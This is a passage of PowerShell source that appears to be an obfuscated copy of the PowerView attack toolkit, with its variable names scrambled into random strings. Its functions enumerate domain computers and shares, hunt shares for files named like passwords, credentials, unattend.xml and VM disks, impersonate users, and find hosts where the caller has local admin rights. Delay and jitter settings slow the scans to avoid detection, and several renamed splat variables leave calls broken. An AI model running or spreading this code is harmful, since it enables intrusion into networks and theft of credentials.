        if ($PSBoundParameters['ComputerLDAPFilter']) { $fYHM6rC1lTm['LDAPFilter'] = $DyvdAEbkrnqStxLz0wmTgV9Kc }
        if ($PSBoundParameters['ComputerSearchBase']) { $fYHM6rC1lTm['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
        if ($PSBoundParameters['Unconstrained']) { $fYHM6rC1lTm['Unconstrained'] = $eXoNv092dGwM1UuRD }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $fYHM6rC1lTm['OperatingSystem'] = $c5fth3UNK }
        if ($PSBoundParameters['ComputerServicePack']) { $fYHM6rC1lTm['ServicePack'] = $txAlgojF79hMWarPfHVYk }
        if ($PSBoundParameters['ComputerSiteName']) { $fYHM6rC1lTm['SiteName'] = $M6Sb30DA }
        if ($PSBoundParameters['Server']) { $fYHM6rC1lTm['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $fYHM6rC1lTm['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $fYHM6rC1lTm['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $fYHM6rC1lTm['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $fYHM6rC1lTm['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $fYHM6rC1lTm['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = $mA
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $IolOzRrjd13cuX6HE = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $5GziPpdnx27jR01h, $5)

            if ($5) {
                
                $qYFR5PCZruUkdna9T = Invoke-UserImpersonation -5 $5 -N1xWHfZFbIiRSwgEOjKdtk
            }

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {
                $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                if ($4zYXe6sFagylcbNCipAf) {
                    
                    $bGhI7QwNF8ZiP64YJ0KyMgCmT = Get-NetShare -mA $ftzgP9UbIARn26koF3CEKXm
                    ForEach ($ZSBS6 in $bGhI7QwNF8ZiP64YJ0KyMgCmT) {
                        $UBPvh3abyHOtNqx = $ZSBS6.Name
                        
                        $a9LvymtQdGPNr8cqgsI = '\\'+$ftzgP9UbIARn26koF3CEKXm+'\'+$UBPvh3abyHOtNqx

                        if (($UBPvh3abyHOtNqx) -and ($UBPvh3abyHOtNqx.trim() -ne '')) {
                            
                            if ($5GziPpdnx27jR01h) {
                                
                                try {
                                    $qYFR5PCZruUkdna9T = [IO.Directory]::GetFiles($a9LvymtQdGPNr8cqgsI)
                                    $ZSBS6
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $a9LvymtQdGPNr8cqgsI : $_"
                                }
                            }
                            else {
                                $ZSBS6
                            }
                        }
                    }
                }
            }

            if ($5) {
                Invoke-RevertToSelf
            }
        }

        $QWX1OeqTMV876JyRF = $qYFR5PCZruUkdna9T
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
            }
            else {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k -N1xWHfZFbIiRSwgEOjKdtk
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-DomainShare] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-DomainShare] Enumerating server $ftzgP9UbIARn26koF3CEKXm ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.count))"
                Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $5GziPpdnx27jR01h, $QWX1OeqTMV876JyRF
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $JcIMRzC5Kitl"

            
            $VH = @{
                'CheckShareAccess' = $5GziPpdnx27jR01h
                'TokenHandle' = $QWX1OeqTMV876JyRF
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Find-InterestingDomainShareFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $mA,

        [ValidateNotNullOrEmpty()]
        [String]
        $hm9FLfR3U5b,

        [ValidateNotNullOrEmpty()]
        [String]
        $DyvdAEbkrnqStxLz0wmTgV9Kc,

        [ValidateNotNullOrEmpty()]
        [String]
        $xrToHFMttDhJiKTDH2QzEmKol,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hv47qcP,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $9s,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $g5wRdT3IbUS2zkc,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $U6UrtLBeH9FHrhjE9C = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $aYQX,

        [String[]]
        $q81X5Fd8T3KYBd = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $yXpw97L6JEbxQ1t409Rk,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $WntZ3jV2Q7IKgNc4mhuvp,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $5dN69gEBTpy2AfnVaqDR,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $lsnufEMYrbDoLkH6G,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $Hq5puV8FBR4ik3ZX9yg,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {
        $fYHM6rC1lTm = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $fYHM6rC1lTm['Domain'] = $hm9FLfR3U5b }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $fYHM6rC1lTm['LDAPFilter'] = $DyvdAEbkrnqStxLz0wmTgV9Kc }
        if ($PSBoundParameters['ComputerSearchBase']) { $fYHM6rC1lTm['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $fYHM6rC1lTm['OperatingSystem'] = $c5fth3UNK }
        if ($PSBoundParameters['ComputerServicePack']) { $fYHM6rC1lTm['ServicePack'] = $txAlgojF79hMWarPfHVYk }
        if ($PSBoundParameters['ComputerSiteName']) { $fYHM6rC1lTm['SiteName'] = $M6Sb30DA }
        if ($PSBoundParameters['Server']) { $fYHM6rC1lTm['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $fYHM6rC1lTm['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $fYHM6rC1lTm['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $fYHM6rC1lTm['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $fYHM6rC1lTm['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $fYHM6rC1lTm['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = $mA
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $IolOzRrjd13cuX6HE = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $U6UrtLBeH9FHrhjE9C, $q81X5Fd8T3KYBd, $lsnufEMYrbDoLkH6G, $SPF9H8A01Gx53zjIlgTCvipL, $Hq5puV8FBR4ik3ZX9yg, $KOlcj5SPXmgzkWFpYA0w, $5)

            if ($5) {
                
                $qYFR5PCZruUkdna9T = Invoke-UserImpersonation -5 $5 -N1xWHfZFbIiRSwgEOjKdtk
            }

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {

                $YM = @()
                if ($ftzgP9UbIARn26koF3CEKXm.StartsWith('\\')) {
                    
                    $YM += $ftzgP9UbIARn26koF3CEKXm
                }
                else {
                    $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                    if ($4zYXe6sFagylcbNCipAf) {
                        
                        $bGhI7QwNF8ZiP64YJ0KyMgCmT = Get-NetShare -mA $ftzgP9UbIARn26koF3CEKXm
                        ForEach ($ZSBS6 in $bGhI7QwNF8ZiP64YJ0KyMgCmT) {
                            $UBPvh3abyHOtNqx = $ZSBS6.Name
                            $a9LvymtQdGPNr8cqgsI = '\\'+$ftzgP9UbIARn26koF3CEKXm+'\'+$UBPvh3abyHOtNqx
                            
                            if (($UBPvh3abyHOtNqx) -and ($UBPvh3abyHOtNqx.Trim() -ne '')) {
                                
                                if ($q81X5Fd8T3KYBd -NotContains $UBPvh3abyHOtNqx) {
                                    
                                    try {
                                        $qYFR5PCZruUkdna9T = [IO.Directory]::GetFiles($a9LvymtQdGPNr8cqgsI)
                                        $YM += $a9LvymtQdGPNr8cqgsI
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $a9LvymtQdGPNr8cqgsI"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($ZSBS6 in $YM) {
                    Write-Verbose "Searching share: $ZSBS6"
                    $9OfKR = @{
                        'Path' = $ZSBS6
                        'Include' = $U6UrtLBeH9FHrhjE9C
                    }
                    if ($lsnufEMYrbDoLkH6G) {
                        $9OfKR['OfficeDocs'] = $lsnufEMYrbDoLkH6G
                    }
                    if ($Hq5puV8FBR4ik3ZX9yg) {
                        $9OfKR['FreshEXEs'] = $Hq5puV8FBR4ik3ZX9yg
                    }
                    if ($yXpw97L6JEbxQ1t409Rk) {
                        $9OfKR['LastAccessTime'] = $yXpw97L6JEbxQ1t409Rk
                    }
                    if ($WntZ3jV2Q7IKgNc4mhuvp) {
                        $9OfKR['LastWriteTime'] = $WntZ3jV2Q7IKgNc4mhuvp
                    }
                    if ($5dN69gEBTpy2AfnVaqDR) {
                        $9OfKR['CreationTime'] = $5dN69gEBTpy2AfnVaqDR
                    }
                    if ($KOlcj5SPXmgzkWFpYA0w) {
                        $9OfKR['CheckWriteAccess'] = $KOlcj5SPXmgzkWFpYA0w
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($5) {
                Invoke-RevertToSelf
            }
        }

        $QWX1OeqTMV876JyRF = $qYFR5PCZruUkdna9T
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
            }
            else {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k -N1xWHfZFbIiRSwgEOjKdtk
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $ftzgP9UbIARn26koF3CEKXm ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.count))"
                Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $U6UrtLBeH9FHrhjE9C, $q81X5Fd8T3KYBd, $lsnufEMYrbDoLkH6G, $SPF9H8A01Gx53zjIlgTCvipL, $Hq5puV8FBR4ik3ZX9yg, $KOlcj5SPXmgzkWFpYA0w, $QWX1OeqTMV876JyRF
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $JcIMRzC5Kitl"

            
            $VH = @{
                'Include' = $U6UrtLBeH9FHrhjE9C
                'ExcludedShares' = $q81X5Fd8T3KYBd
                'OfficeDocs' = $lsnufEMYrbDoLkH6G
                'ExcludeHidden' = $SPF9H8A01Gx53zjIlgTCvipL
                'FreshEXEs' = $Hq5puV8FBR4ik3ZX9yg
                'CheckWriteAccess' = $KOlcj5SPXmgzkWFpYA0w
                'TokenHandle' = $QWX1OeqTMV876JyRF
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }

    END {
        if ($QWX1OeqTMV876JyRF) {
            Invoke-RevertToSelf -5 $QWX1OeqTMV876JyRF
        }
    }
}


function Find-LocalAdminAccess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $mA,

        [ValidateNotNullOrEmpty()]
        [String]
        $hm9FLfR3U5b,

        [ValidateNotNullOrEmpty()]
        [String]
        $DyvdAEbkrnqStxLz0wmTgV9Kc,

        [ValidateNotNullOrEmpty()]
        [String]
        $xrToHFMttDhJiKTDH2QzEmKol,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hv47qcP,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $9s,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $g5wRdT3IbUS2zkc,

        [Switch]
        $5GziPpdnx27jR01h,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {
        $fYHM6rC1lTm = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $fYHM6rC1lTm['Domain'] = $hm9FLfR3U5b }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $fYHM6rC1lTm['LDAPFilter'] = $DyvdAEbkrnqStxLz0wmTgV9Kc }
        if ($PSBoundParameters['ComputerSearchBase']) { $fYHM6rC1lTm['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
        if ($PSBoundParameters['Unconstrained']) { $fYHM6rC1lTm['Unconstrained'] = $eXoNv092dGwM1UuRD }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $fYHM6rC1lTm['OperatingSystem'] = $c5fth3UNK }
        if ($PSBoundParameters['ComputerServicePack']) { $fYHM6rC1lTm['ServicePack'] = $txAlgojF79hMWarPfHVYk }
        if ($PSBoundParameters['ComputerSiteName']) { $fYHM6rC1lTm['SiteName'] = $M6Sb30DA }
        if ($PSBoundParameters['Server']) { $fYHM6rC1lTm['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $fYHM6rC1lTm['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $fYHM6rC1lTm['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $fYHM6rC1lTm['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $fYHM6rC1lTm['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $fYHM6rC1lTm['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = $mA
        }
        else {
            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
            $IolOzRrjd13cuX6HE = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $5)

            if ($5) {
                
                $qYFR5PCZruUkdna9T = Invoke-UserImpersonation -5 $5 -N1xWHfZFbIiRSwgEOjKdtk
            }

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {
                $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                if ($4zYXe6sFagylcbNCipAf) {
                    
                    $W956O = Test-AdminAccess -mA $ftzgP9UbIARn26koF3CEKXm
                    if ($W956O.IsAdmin) {
                        $ftzgP9UbIARn26koF3CEKXm
                    }
                }
            }

            if ($5) {
                Invoke-RevertToSelf
            }
        }

        $QWX1OeqTMV876JyRF = $qYFR5PCZruUkdna9T
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
            }
            else {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k -N1xWHfZFbIiRSwgEOjKdtk
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
                $Rh20Opw9tSA3v = $Rh20Opw9tSA3v + 1

                
                Start-Sleep -Seconds $nmZcyGY5SOqoDKFvr7eM038.Next((1-$ihajtIg)*$BLzXIZ, (1+$ihajtIg)*$BLzXIZ)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $ftzgP9UbIARn26koF3CEKXm ($Rh20Opw9tSA3v of $($IolOzRrjd13cuX6HE.count))"
                Invoke-Command -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ArgumentList $ftzgP9UbIARn26koF3CEKXm, $QWX1OeqTMV876JyRF
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $JcIMRzC5Kitl"

            
            $VH = @{
                'TokenHandle' = $QWX1OeqTMV876JyRF
            }

            
            New-ThreadedFunction -mA $IolOzRrjd13cuX6HE -ScriptBlock $p1gY8tCQOFWmJ0zubMcak2 -ScriptParameters $VH -JcIMRzC5Kitl $JcIMRzC5Kitl
        }
    }
}


function Find-DomainLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $mA,

        [ValidateNotNullOrEmpty()]
        [String]
        $hm9FLfR3U5b,

        [ValidateNotNullOrEmpty()]
        [String]
        $DyvdAEbkrnqStxLz0wmTgV9Kc,

        [ValidateNotNullOrEmpty()]
        [String]
        $xrToHFMttDhJiKTDH2QzEmKol,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hv47qcP,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $9s,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $g5wRdT3IbUS2zkc,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $YePFivOGqr = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $b07KAXTqvUWxSfk = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $BLzXIZ = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $ihajtIg = .3,

        [Int]
        [ValidateRange(1, 100)]
        $JcIMRzC5Kitl = 20
    )

    BEGIN {
        $fYHM6rC1lTm = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $fYHM6rC1lTm['Domain'] = $hm9FLfR3U5b }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $fYHM6rC1lTm['LDAPFilter'] = $DyvdAEbkrnqStxLz0wmTgV9Kc }
        if ($PSBoundParameters['ComputerSearchBase']) { $fYHM6rC1lTm['SearchBase'] = $xrToHFMttDhJiKTDH2QzEmKol }
        if ($PSBoundParameters['Unconstrained']) { $fYHM6rC1lTm['Unconstrained'] = $eXoNv092dGwM1UuRD }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $fYHM6rC1lTm['OperatingSystem'] = $c5fth3UNK }
        if ($PSBoundParameters['ComputerServicePack']) { $fYHM6rC1lTm['ServicePack'] = $txAlgojF79hMWarPfHVYk }
        if ($PSBoundParameters['ComputerSiteName']) { $fYHM6rC1lTm['SiteName'] = $M6Sb30DA }
        if ($PSBoundParameters['Server']) { $fYHM6rC1lTm['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $fYHM6rC1lTm['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $fYHM6rC1lTm['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $fYHM6rC1lTm['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $fYHM6rC1lTm['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $fYHM6rC1lTm['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['ComputerName']) {
            $IolOzRrjd13cuX6HE = $mA
        }
        else {
            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
            $IolOzRrjd13cuX6HE = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($IolOzRrjd13cuX6HE.Length)"
        if ($IolOzRrjd13cuX6HE.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        
        $p1gY8tCQOFWmJ0zubMcak2 = {
            Param($mA, $YePFivOGqr, $b07KAXTqvUWxSfk, $5)

            
            if ($YePFivOGqr -eq "Administrators") {
                $rVSon9 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$qYFR5PCZruUkdna9T)
                $YePFivOGqr = ($rVSon9.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($5) {
                
                $qYFR5PCZruUkdna9T = Invoke-UserImpersonation -5 $5 -N1xWHfZFbIiRSwgEOjKdtk
            }

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $mA) {
                $4zYXe6sFagylcbNCipAf = Test-Connection -Count 1 -N1xWHfZFbIiRSwgEOjKdtk -mA $ftzgP9UbIARn26koF3CEKXm
                if ($4zYXe6sFagylcbNCipAf) {
                    $PDf = @{
                        'ComputerName' = $ftzgP9UbIARn26koF3CEKXm
                        'Method' = $b07KAXTqvUWxSfk
                        'GroupName' = $YePFivOGqr
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($5) {
                Invoke-RevertToSelf
            }
        }

        $QWX1OeqTMV876JyRF = $qYFR5PCZruUkdna9T
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k
            }
            else {
                $QWX1OeqTMV876JyRF = Invoke-UserImpersonation -3ezVSfm6f4k $3ezVSfm6f4k -N1xWHfZFbIiRSwgEOjKdtk
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($IolOzRrjd13cuX6HE.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $BLzXIZ, Jitter: $ihajtIg"
            $Rh20Opw9tSA3v = 0
            $nmZcyGY5SOqoDKFvr7eM038 = New-Object System.Random

            ForEach ($ftzgP9UbIARn26koF3CEKXm in $IolOzRrjd13cuX6HE) {
